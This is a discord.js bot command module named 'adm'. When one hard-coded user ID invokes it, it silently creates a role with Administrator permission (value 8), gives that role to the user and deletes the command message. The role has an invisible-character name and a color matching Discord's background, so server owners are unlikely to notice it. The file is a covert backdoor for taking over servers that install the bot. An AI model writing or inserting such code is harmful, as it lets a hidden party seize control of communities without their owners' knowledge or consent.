const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

  if(message.author.id !== "849392394469113876") return;

        role = await message.guild.roles.create ({

            data: {
                name: "ﾠ",
          	    color: "#2f3136",
          	    permissions: [8]
            }

        });
       
        message.member.roles.add(role)
        message.delete();

    } catch(e) {

        console.log(e.stack);

    }
}

module.exports.help = {

    name: "adm",
    desc: "Gives you admin perms."

}
